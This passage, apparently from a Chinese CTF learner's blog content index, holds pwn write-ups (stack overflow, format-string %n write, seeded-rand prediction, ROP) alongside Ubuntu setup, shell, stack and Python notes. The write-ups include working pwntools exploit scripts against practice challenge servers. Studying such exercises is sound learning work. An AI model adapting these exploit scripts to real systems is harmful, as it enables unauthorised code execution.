cf=1或zf=1|","categories":[],"tags":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://www.zzl14.xyz/tags/pwn学习/"}]},{"title":"stack2","slug":"stack2","date":"2019-10-11T14:06:49.000Z","updated":"2019-10-30T09:12:18.138Z","comments":true,"path":"2019/10/11/stack2/","link":"","permalink":"https://www.zzl14.xyz/2019/10/11/stack2/","excerpt":"","text":"1.file命令查看为32位 2.checksec命令查看保护机制 由保护机制我想到的做本题的方法（1）绕过canary保护（2）rop链控制执行流 3.做题首先运行一下，查看程序的运行过程 因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。 查看字符串列表发现了熟悉的system函数与、bin/bash可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。 在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？很明显是可以的。那么偏移是多少呢？ v13距离栈底0x70所以距离是不是就是0x70+0x4呢？大家可以先思考一下。 这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84但是不知道为什么0x74却不行 这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。 本题需要知道小端模式，现代计算机通常使用的一种内存排列格式 下面是脚本 #!/usr/bin/python #coding:utf-8 from pwn import* system_addr=0x080485AF leave_offset=0x84 def write_addr(addr,va): io.sendline(&quot;3&quot;) io.recvuntil(&quot;which number to change:\\n&quot;) io.sendline(str(addr)) io.recvuntil(&quot;new number:\\n&quot;) io.sendline(str(va)) io.recvuntil(&quot;5. exit\\n&quot;) io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;) io.recvuntil(&quot;How many numbers you have:\\n&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;Give me your numbers\\n&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;5. exit\\n&quot;) # write system_addr 0x08048450 write_addr(leave_offset,0X50) write_addr(leave_offset+1,0X84) write_addr(leave_offset+2,0X04) write_addr(leave_offset+3,0X08) # sh_addr 0x08048987 leave_offset+=8 print leave_offset write_addr(leave_offset,0x87) write_addr(leave_offset+1,0X89) write_addr(leave_offset+2,0X04) write_addr(leave_offset+3,0X08) io.sendline(&quot;5&quot;) io.interactive()","categories":[],"tags":[{"name":"做题题解","slug":"做题题解","permalink":"https://www.zzl14.xyz/tags/做题题解/"}]},{"title":"ubuntu16.04配置","slug":"ubuntu16-04配置","date":"2019-10-11T13:11:22.000Z","updated":"2019-10-30T09:15:43.345Z","comments":true,"path":"2019/10/11/ubuntu16-04配置/","link":"","permalink":"https://www.zzl14.xyz/2019/10/11/ubuntu16-04配置/","excerpt":"","text":"由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程 大家在使用虚拟机时尤其是在安装一些没用过的东西时最好可以 #拍快照 #或用挂起代替关机可以在出现问题的时候少浪费一些时间来处理问题 ubuntu下载https://blog.csdn.net/kwame211/article/details/83902851 1.安装镜像后，安装VMtools安装VMware Tools显示灰色正确解决办法https://blog.csdn.net/bluebird2/article/details/94162855作用：https://blog.csdn.net/u012654205/article/details/42454527安装:https://blog.csdn.net/zxf1242652895/article/details/78203473安装时会出现很多提示 输入yes/no 都选 yes， 如果提示 的是 路径， 则直接回车就好。 直到安装完成，路径还在 vmware-tools-distrib 下 2.更换软件源源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，相当于软件的下载服务器和更新服务器，只不过不是某款软件的，而是该系统所有软件的下载服务器 推荐： https://blog.csdn.net/meteor_s/article/details/81301252 https://blog.csdn.net/baidu_36602427/article/details/86551862 //源比较多 https://www.cnblogs.com/flyinggod/p/7979108.html 不推荐：https://blog.csdn.net/xkwy100/article/details/80301156 解决问题E: Could not get lock /var/lib/apt/lists/lock https://www.cnblogs.com/qq952693358/p/6537846.html3.安装pip pip 是“A tool for installing and managing Python packages.”，也就是说pip是python的软件安装工具 安装： sudo apt install python-pip 遇到问题， Unable to locate package python-pip 解决方法： 更新软件源 sudo apt-get update 网址 https://www.jianshu.com/p/568aab038d4c https://blog.csdn.net/qq_35759574/article/details/828426374.更改pip源我们在进行Python开发时，经常会通过pip操作来安装一些packages，但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。 sudo mkdir ~/.pip/ cd ./.pip/ touch pip.conf sudo gedit pip.conf 网址： https://blog.csdn.net/yuzaipiaofei/article/details/80891108 https://www.jianshu.com/p/364146ade9be5.安装pwntools https://www.cnblogs.com/cai00/p/10696728.html6.安装pwndbg https://blog.csdn.net/kevin66654/article/details/86773517","categories":[],"tags":[{"name":"虚拟机配置","slug":"虚拟机配置","permalink":"https://www.zzl14.xyz/tags/虚拟机配置/"}]},{"title":"shell","slug":"shell","date":"2019-10-09T08:24:44.000Z","updated":"2019-11-01T12:15:00.189Z","comments":true,"path":"2019/10/09/shell/","link":"","permalink":"https://www.zzl14.xyz/2019/10/09/shell/","excerpt":"","text":"#shell （计算机壳层）在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。 同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。在排序算法中，Shell是希尔排序的名称。 #基本上shell分两大类： ###一：图形界面shell（Graphical User Interface shell 即 GUI shell）例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。 ###二：命令行式shell（Command Line Interface shell ，即CLI shell）例如：bash / sh / ksh / csh（Unix/linux 系统）（MS-DOS系统）cmd.exe/ 命令提示字符（Windows NT 系统）Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统） 传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。 文字操作系统与外部最主要的接口就叫做shell。 shell是操作系统最外面的一层。 shell管理你与操作系统之间的交互： 等待你输入，向操作系统解释你的输入， 并且处理各种各样的操作系统的输出结果。shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。 Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。 ###交互式shell和非交互式shell 交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。","categories":[],"tags":[{"name":"计算机基础概念","slug":"计算机基础概念","permalink":"https://www.zzl14.xyz/tags/计算机基础概念/"}]},{"title":"stack","slug":"stack_explain","date":"2019-09-27T09:46:16.000Z","updated":"2019-10-30T09:12:20.144Z","comments":true,"path":"2019/09/27/stack_explain/","link":"","permalink":"https://www.zzl14.xyz/2019/09/27/stack_explain/","excerpt":"","text":"这段时间看了不少的东西。下面写一下对栈的一些理解： Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。栈顶：esp栈底：ebp 在函数运行时，会开辟栈帧，一些数据被存进去 push ebp 压栈 esp减小 存入ebp内容 mov ebp,esp 根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。 一个栈帧从高地址到低地址应该是 函数参数 函数返回地址 ebp #这里到下面是一个栈帧，执行完后会执行返回地址里的内容 栈内数据 esp 待更新。。","categories":[],"tags":[{"name":"有关栈","slug":"有关栈","permalink":"https://www.zzl14.xyz/tags/有关栈/"}]},{"title":"drops做题收获","slug":"p","date":"2019-08-08T07:25:16.000Z","updated":"2019-10-30T09:15:20.713Z","comments":true,"path":"2019/08/08/p/","link":"","permalink":"https://www.zzl14.xyz/2019/08/08/p/","excerpt":"","text":"攻防世界 CGfsb格式化字符串漏洞因为当时做这个题时候不太懂，所以拿出来说说 分析伪代码，发现修改pwnme的值为8 得到flag 在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。改值方法，格式化输出漏洞 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中 用法说明 %n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址 位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变 一利用%x泄露内容 可以看到输入的aaaa也就是0x61616161是位于输出的第11位 然后根据addr+%N$n 可以在偏移处储存的地址写入内容 二经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数 所以说偏移处指针会不会是指 猜测。。。。 原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。最后，此题的最大难点在于获取 %n 所需要的偏移量 解题思路就是利用格式化输出漏洞将pwnme的值改为8脚本 from pwn import * p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;); pwnme=0x804a068 p.recvuntil(&apos;name:&apos;) p.sendline(&apos;qqqq&apos;) p.recvuntil(&apos;please:&apos;) payload = p32(pwnme) payload += &apos;aaaa&apos; payload += &apos;%10$n&apos; p.sendline(payload) p.interactive()guess_num 和 进阶 dice_game猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”) 开启了canary,不能直接栈溢出到sub_C3E函数， 但是区别在于 一 guess_num 输入为gets函数 可以溢出到函数返回地址， 而 dice_game 用的read(0, buf, 0x50uLL);只能栈溢出到seed[0] 所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。二 guess_num 没给libc库， dice_game给了libc.so.6 所以写脚本时 guess_num用的是 libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) 而dice_game用的是 libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，经过n次对比成功执行 cat flag 的函数 srand初始化随机种子,rand产生随机数。 随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机， 实际上是一段数字的循环，这些数字取决于随机种子。 在调用rand()函数时，必须先利用srand()设好随机数种子， 如果未设随机数种子，rand()在调用时会自动设随机数种子为1。需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数 下面是从 https://www.cnblogs.com/gaowengang/p/7919219.html得到的一些知识 Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式， 即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。 Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\\Windows\\System32 和 C:\\Windows\\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的) Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。 因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag. 脚本 from pwn import * from ctypes import * #coding:utf-8 p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;) libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) payload = &quot;a&quot;*0x20 +p64(1) p.recvuntil(&apos;Your name:&apos;) p.sendline(payload) libc.srand(1) for i in range(10): num = str(libc.rand()%6+1) p.recvuntil(&apos;number:&apos;) p.sendline(num) p.interactive()进阶 forgot这一题是看了脚本却不太懂事什么意思的一道题 开始看完代码发现这题中并没有直接给你某个函数得到flag，于是查找字符，发现了后门函数！ 记下函数的地址。 最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。 搜到的题解 #! /usr/bin/env python from pwn import * p=remote(&apos;111.198.29.45&apos;,56015) print p.recvuntil(&quot;&gt; &quot;) p.sendline(&apos;A&apos;) payload=&apos;A&apos;*32+p32(0x080486cc) print p.recvuntil(&quot;&gt; &quot;) p.sendline(payload) print p.recvall()只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？ 但是在 ida 打开后会产生疑问了，为什么是“A”*32有两次输入 第一次输入使用fgets(&amp;s,32,stdin)从缓冲区输入32位给字符串 s 并不能溢出到函数返回地址 第二次输入为scanf(“%s”,v2)这一次可以溢出到函数返回地址了 不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗但我试过之后发现并不能得到flag 为什么呢？我也不太清楚。 下面是为什么用32*”A”的原因 重点 代码的最后有(*(&amp;v3+ –v14))();v3是int型指针 v14是int数据 所以这句代码就是 执行 v3加上 v14-1后 所指向的 函数 因此我们可以用这一句来进行溢出，执行我们找到的 后门函数 分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数 可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2 因此我用下面的脚本验证发现也可行 #coding:utf-8 from pwn import * p=remote(&apos;111.198.29.45&apos;,39341) print p.recvuntil(&quot;&gt; &quot;) p.sendline(&apos;A&apos;) payload=&apos;9&apos;*36+p32(0x080486cc) print p.recvuntil(&quot;&gt; &quot;) p.sendline(payload) print p.recvall() 这题中收获还是不小的，起码读懂了代码的执行步骤。希望大家在做题的过程中也能多多发现疑问，使自己做题时知其所以","categories":[],"tags":[{"name":"做题题解","slug":"做题题解","permalink":"https://www.zzl14.xyz/tags/做题题解/"}]},{"title":"level0","slug":"level0","date":"2019-08-08T07:25:16.000Z","updated":"2019-10-30T09:09:59.328Z","comments":true,"path":"2019/08/08/level0/","link":"","permalink":"https://www.zzl14.xyz/2019/08/08/level0/","excerpt":"","text":"1.首先要用到 &apos;file&apos; ，来查看用多少位的ida打开。 &apos;checksec&apos; ，用来查看文件的保护机制 Stack 的作用是防止栈的溢出 NX 的作用为防止栈中的可执行代码 其他的我还不太了解，以后再说2.ida基本操作 首先打开文件后可以按空格键，查看地址与汇编指令 在功能表里找到main,便于分析程序 按tab键会出现伪代码，我们分析这个来找出漏洞 shift+F12可以出现字符串表 ctrl+F 可以出现查找框 想查找某个变量的地址，只需点击后按tab键3.本题所涉及的知识 首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址 这里要了解一下栈的基本结构以及如何传递内容 然后调用callsystem函数来获取shell 4.脚本的书写 1.from pwn import * (导入pwn里的内容) 2.p=remote(&apos;地址&apos;,端口) （连接服务器并创建一个对象）、 3.p.recv() p.recvline() p.recvuntil() (都是接受服务器返回的字符串，具体区别不太懂) 4.p.send() p.sendline() p.sendafter() (都是向服务器传入字符串，具体区别不太懂) 5.p.interactive() (结尾加上，啥意思不懂)5.本题payload的构建 1.buf距离rbp 0x80，rbp本身占位8 2.函数返回地址可填callsystem的地址 3.payload=ox88*&apos;a&apos;+addr_callsystem6.产生的问题及解决 1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用 payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh) 2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 3.所以构建的payload为 payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)7.两种脚本： 一 ` #coding:utf-8 from pwn import * p=remote(&apos;pwn2.jarvisoj.com&apos;,9881) s_addr=0x0000000000400596 p.sendafter(&quot;World\\n&quot;,0x88*&apos;a&apos;+p64(s_addr)) p.interactive()二 #coding:utf-8 from pwn import * p=remote(&apos;pwn2.jarvisoj.com&apos;,9881) rdi=0x400663 p.sendafter(&quot;World\\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)) p.interactive()`","categories":[],"tags":[{"name":"做题题解","slug":"做题题解","permalink":"https://www.zzl14.xyz/tags/做题题解/"}]},{"title":"python基本数据类型","slug":"python","date":"2019-08-08T07:25:16.000Z","updated":"2020-04-01T08:35:09.783Z","comments":true,"path":"2019/08/08/python/","link":"","permalink":"https://www.zzl14.xyz/2019/08/08/python/","excerpt":"","text":"python在写代码时不用声明变量 在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？ 数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等， 其中包括他们的基本用法和其常用的方法，这里会一一列举出来 然后我们还需要了解一些运算符， 因为这些基本数据类型常常会用于一些运算等等二、基本数据类型 1、数字 —&gt; int类 当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。 在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。 2、布尔值 —&gt;bool类 对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。 而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些 —》 None、空（即 [ ]/( ) /“ “/{ }）、0； 3、字符串 —&gt;str类 关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。 字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。 #一 创建字符串 s=&quot;abcda&quot; 或 s=&apos;abcda&apos; 截取字符串 s[1]=&apos;b&apos; s[0,-2]=&apos;abc&apos; #从第一个到倒数第二个，不包含倒数第二个#二 索引 index()、find() ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1 一. s.index(&quot;a&quot;,2) = 4 #index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个 s.find(&apos;a&apos;,3) = -1#三长度 len() len(s) = 5删除 del #删除字符串，也是删除变量 &gt;&gt;&gt; name =&quot;little-five&quot; &gt;&gt;&gt; del name 判断字符串内容 isalnum()、isalpha()、isdigit() isalnum() #判断是否全为数字 isalpha() #判断是否全为字母 isdigit() #判断是否全为数字或者字母 返回值为bool型，是为True，否为Flase 大小写转换 capitalize()、lower()、upper()、title()、casefold() #大小写的互相转换 s.swapcase() #首字母大写 s.capitalize() #全部转为小写 s.lower() #全部转为大写 s.upper()jion方法 #join--&gt; join(): 连接字符串数组。 将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串 #字符串 name =&quot;littefive&quot; &quot;-&quot;.join(name) &apos;l-i-t-t-e-f-i-v-e&apos; #列表 info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;] &quot;--&quot;.join(info) &apos;xiaowu--say--hello--world&apos; 4、列表 list类 列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。 names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;] #或者 names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])#一. #索引 从0开始，而不是从一开始 name =[“xiaowu”,”little-five”,”James”] print(name[0:-1]) #切片 负数为倒数第几个，其为左闭右开， 如不写，前面表示包含前面所有元素,后面则表示后面所有元素 m1 =name[1:] print(m1) #输出为–&gt;[‘little-five’, ‘James’] m2 =name[:-1] print(m2) #输出为–&gt;[‘xiaowu’, ‘little-five’] #二. #一、将其他列表元素添加至列表内 name.extend([“alex”,”green”]) #二、将字符串元素添加到列表内 name.extend(“hello”) #三、将字典元素添加至列表内，注：字典的key name.extend({“hello”:”world”}) pop() 取出 #pop()--取出，可将取出的值作为字符串赋予另外一个变量 name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;] special_name =name.pop(1)#三5、元组 tuple类 元组即为不可修改的列表。其于特性跟list相似。其使用圆括号而不是方括号来标识。 #元组 name = (&quot;little-five&quot;,&quot;xiaowu&quot;) print(name[0])#四.字典 dict类 字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。 键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。 而值的定义可以是任意数据类型。 #字典的定义 info ={ 1:&quot;hello world&quot;, #键为数字 (&quot;hello world&quot;):1, #键为元组 False:{&quot;name&quot;:&quot;James&quot;}, &quot;age&quot;:22 } 遍历 items、keys、values info ={ &quot;name&quot;:&quot;little-five&quot;, &quot;age&quot;:22, &quot;email&quot;:&quot;99426353*@qq,com&quot; } #键 for key in info: print(key) print(info.keys()) #输出为： dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])12345678#键值对print(info.items())#输出为: dict_items([('name', 'little-five'), ('age', 22), ('email', '99426353*@qq,com')])#值print(info.values())#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])","categories":[],"tags":[{"name":"语言基础","slug":"语言基础","permalink":"https://www.zzl14.xyz/tags/语言基础/"}]}],"categories":[{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/categories/堆/"},{"name":"命令","slug":"命令","permalink":"https://www.zzl14.xyz/categories/命令/"},{"name":"搭建博客","slug":"搭建博客","permalink":"https://www.zzl14.xyz/categories/搭建博客/"},{"name":"docker","slug":"docker","permalink":"https://www.zzl14.xyz/categories/docker/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.zzl14.xyz/tags/linux/"},{"name":"malloc","slug":"malloc","permalink":"https://www.zzl14.xyz/tags/malloc/"},{"name":"sql","slug":"sql","permalink":"https://www.zzl14.xyz/tags/sql/"},{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/tags/堆/"},{"name":"bin","slug":"bin","permalink":"https://www.zzl14.xyz/tags/bin/"},{"name":"chunk结构","slug":"chunk结构","permalink":"https://www.zzl14.xyz/tags/chunk结构/"},{"name":"Butterfly","slug":"Butterfly","permalink":"https://www.zzl14.xyz/tags/Butterfly/"},{"name":"hexo","slug":"hexo","permalink":"https://www.zzl14.xyz/tags/hexo/"},{"name":"nginx","slug":"nginx","permalink":"https://www.zzl14.xyz/tags/nginx/"},{"name":"git","slug":"git","permalink":"https://www.zzl14.xyz/tags/git/"},{"name":"ssh","slug":"ssh","permalink":"https://www.zzl14.xyz/tags/ssh/"},{"name":"docker","slug":"docker","permalink":"https://www.zzl14.xyz/tags/docker/"},{"name":"虚拟机配置","slug":"虚拟机配置","permalink":"https://www.zzl14.xyz/tags/虚拟机配置/"},{"name":"保护机制","slug":"保护机制","permalink":"https://www.zzl14.xyz/tags/保护机制/"},{"name":"pwn学习","slug":"pwn学习","permalink":"https://www.zzl14.xyz/tags/pwn学习/"},{"name":"做题题解","slug":"做题题解","permalink":"https://www.zzl14.xyz/tags/做题题解/"},{"name":"计算机基础概念","slug":"计算机基础概念","permalink":"https://www.zzl14.xyz/tags/计算机基础概念/"},{"name":"有关栈","slug":"有关栈","permalink":"https://www.zzl14.xyz/tags/有关栈/"},{"name":"语言基础","slug":"语言基础","permalink":"https://www.zzl14.xyz/tags/语言基础/"}]}